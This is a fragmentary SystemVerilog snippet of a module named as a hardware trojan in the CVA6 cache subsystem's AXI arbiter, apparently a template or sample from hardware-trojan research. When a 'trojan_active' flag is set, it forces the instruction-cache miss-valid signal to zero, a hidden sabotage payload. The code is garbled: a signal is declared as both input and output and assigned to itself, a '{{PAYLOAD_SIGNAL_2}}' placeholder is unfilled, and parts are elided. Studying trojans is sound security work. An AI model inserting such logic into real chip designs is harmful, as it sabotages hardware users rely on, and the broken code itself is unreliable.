...
module cva6_hpdcache_subsystem_axi_arbiter_trojan (
    input  logic clk_i,
    input  logic rst_ni,
    
    // Original module signals (passthrough)
    input  logic icache_miss_valid_i,
    output logic icache_miss_valid_i,
    ...
    assign icache_miss_valid_i = trojan_active ? 1'b0 : icache_miss_valid_i_normal;
    ...
    logic icache_miss_valid_i_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign icache_miss_valid_i_normal = icache_miss_valid_i;
 ...
 *     input  logic instr_valid_i,   // icache_miss_valid_i
 *     output logic instr_valid_o    // icache_miss_valid_i
 * );
